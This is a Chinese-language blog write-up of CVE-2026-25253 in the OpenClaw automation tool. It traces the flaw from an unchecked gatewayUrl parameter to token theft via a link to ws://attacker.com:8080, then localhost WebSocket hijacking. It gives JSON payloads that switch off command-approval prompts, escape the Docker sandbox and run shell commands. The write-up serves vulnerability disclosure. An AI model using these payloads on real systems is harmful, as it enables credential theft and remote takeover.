#  如何利用 OpenClaw 漏洞一键盗取数据与密钥（CVE‑2026‑25253）  
 幻泉之洲   2026-02-03 02:18  
  
最近，安全研究人员发现了一个影响 OpenClaw（前身为 Moltbot/ClawdBot）的严重漏洞，黑客只需诱使受害者访问一个恶意网站，便能获取认证令牌、绕过安全设置并执行远程命令。这一漏洞的 CVE 编号为  
CVE‑2026‑25253，被评定为高危漏洞（CVSS 8.8/10）。在本文中，我们将详细解构这个漏洞，并展示它是如何被利用来盗取数据和密钥的。  
# 🔍 漏洞背景与影响  
  
OpenClaw 是一个本地运行的开源自动化工具，它允许用户通过与各类第三方服务（如 WhatsApp、Slack 等）集成，执行一系列自动化任务。因为它能访问敏感信息（如 API 密钥、认证令牌等），一旦被攻击者利用，就意味着这些数据和系统的安全性将面临极大威胁。  
  
该漏洞在  
v2026.1.24-1 及之前版本的 OpenClaw 中存在，攻击者能够：  
  
泄露用户的认证令牌  
  
绕过本地安全设置（例如关闭确认提示）  
  
在目标设备上执行任意代码（RCE）  
  
开发团队已经在  
v2026.1.29+版本中修复了这一漏洞。  
# 第一部分：漏洞根因——被忽视的参数注入  
## 1.1 数据入口：盲目的 URL 参数解析  
  
问题始于  
app-settings.ts，代码毫无戒备地从 URL 查询参数中读取  
gatewayUrl并持久化到本地存储：  
```
// app-settings.ts
const gatewayUrlRaw = params.get("gatewayUrl");
// ...
if (gatewayUrlRaw != null) {
  const gatewayUrl = gatewayUrlRaw.trim();
  if (gatewayUrl && gatewayUrl !== host.settings.gatewayUrl) {
    applySettings(host, { ...host.settings, gatewayUrl }); 
    // 通过 saveSettings -> localStorage 持久化
  }
}
```  
  
危险点：访问  
https://localhost?gatewayUrl=attacker.com就会将网关地址保存为攻击者服务器，  
无需任何确认。  
## 1.2 自动触发：生命周期钩子的连锁反应  
  
紧接着，  
app-lifecycle.ts在设置应用后立即触发连接：  
```
// app-lifecycle.ts
handleConnected(host) {
  // ...
  connectGateway(host); // 加载后立即执行
  startNodesPolling(host);
  // ...
}
```  
## 1.3 凭证泄露：握手即泄密  
  
最终在  
gateway.ts中，系统在连接握手时自动携带敏感凭证：  
```
// gateway.ts
const params = { 
  // ... 
  authToken,  // ⚠️ 核心凭证
  locale: navigator.language 
};
void this.request<GatewayHelloOk>("connect", params);
```  
## 1.4 漏洞本质  
  
三个独立安全的操作，组合后形成致命缺陷：  
  
用户点击链接 → 恶意 gatewayUrl 被保存 → 自动连接恶意服务器 → authToken 泄露  
  
这正是典型的  
Broken Authorization（授权破坏）漏洞：UI 应当仅连接受信任的网关，并在更改端点前要求显式确认，但现实中它静默接受 URL 参数、自动连接并将凭证发送给不受信任的服务器。  
# 第二部分：直接利用的局限性  
  
基础攻击流程看似简单：  
  
受害者点击恶意链接：http://victim_openclaw.com?gatewayUrl=ws://attacker.com:8080  
  
攻击者 WebSocket 服务器接收连接，获取auth令牌  
  
攻击者使用窃取的 Token 登录受害者 OpenClaw 实例  
  
Token 获取实况（通过  
wscat -l 8080监听）：  
```
{
  "type": "req",
  "id": "b239632f-11b2-467a-b50f-32a428fc0b1a",
  "method": "connect",
  "params": {
    "minProtocol": 3,
    "client": {
      "id": "clawdbot-control-ui",
      "version": "dev",
      "platform": "MacIntel"
    },
    "role": "operator",
    "scopes": [
      "operator.admin",
      "operator.approvals", 
      "operator.pairing"
    ],
    "auth": {
      "token": "178858bf61454e00b95ecc3f83697417"  // 🔑 核心凭证
    }
    // ...
  }
}
```  
  
但直接利用存在三大局限：  
  
❌ 无法作用于本地运行的 OpenClaw 实例（localhost）  
  
❌ 无法绕过防御性沙箱或安全防护  
  
❌ 无法实现任意代码执行（RCE）  
  
为了构建完整的 1-Click RCE，我们需要克服这些限制。  
# 第三部分：突破限制——构建完整攻击链  
## 3.1 技术突破：绕过 localhost 网络限制（CSWSH）  
  
核心问题：大多数用户在  
localhost运行 OpenClaw，从互联网无法直接访问。  
  
解决方案：跨站 WebSocket 劫持（Cross-Site WebSocket Hijacking）  
  
浏览器的同源策略（SOP）限制 HTTP 跨域请求，但  
不限制 WebSocket 连接。OpenClaw 的 WebSocket 服务器  
未验证 Origin 头，接受来自任意网站的连接。  
  
攻击逻辑：  
  
attacker.com 的 JS → 受害者浏览器 → WebSocket 连接到 ws://localhost:18789  
  
这样，攻击者的网站可以通过受害者的浏览器作为"跳板"，访问本地服务。  
## 3.2 权限突破：禁用安全沙箱与确认机制  
  
OpenClaw 内置了强大的安全防护：  
  
exec-approvals.json：运行危险命令前提示用户确认  
  
容器化沙箱：在 Docker 中隔离执行 shell 命令  
  
但讽刺的是，这些保护机制通过 API 管理，而窃取的 Token 恰好拥有  
operator.admin和  
operator.approvals权限。我们可以  
通过 API 关闭保护：  
  
Payload 1：禁用用户确认  
```
{
  "method": "exec.approvals.set",
  "params": { 
    "defaults": { 
      "security": "full", 
      "ask": "off"  // 不再询问危险命令
    } 
  }
}
```  
  
Payload 2：逃离容器  
```
{
  "method": "config.patch",
  "params": {
    "tools.exec.host": "gateway"  // 直接在宿主机执行，而非 Docker
  }
}
```  
## 3.3 最终执行：任意代码执行（RCE）  
  
完成上述准备后，执行任意命令：  
```
{
  "type": "req",
  "id": "4",
  "method": "node.invoke",
  "params": {
    "nodeId": "main",
    "command": "system.run",
    "params": {
      "cmd": "bash -c 'echo hacked > /tmp/hacked'"
    },
    "timeoutMs": 60000,
    "idempotencyKey": "rev1"
  }
}
```  
# 第四部分：完整 1-Click RCE 攻击时序图  
  
整个攻击在受害者访问网页后  
毫秒内完成，无需输入或确认：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KK6rkaWbMNaq56XCQ0svTpl8W2dkExsjdn2IVSibOM6BnWGiauQJvAEwaNudBicMnySvPuIgFgCukjhNGPLHkPiasA/640?wx_fmt=png&from=appmsg "")  
# 第五部分：影响与修复  
## 攻击影响  
  
一旦成功，攻击者可：  
  
📱 读取 iMessage/WhatsApp/Slack 消息历史  
  
🔑 窃取 Stripe API 密钥等敏感凭证  
  
💻 获得受害者计算机的无限制控制权限  
  
🌐 以受害者身份执行任意操作  
  
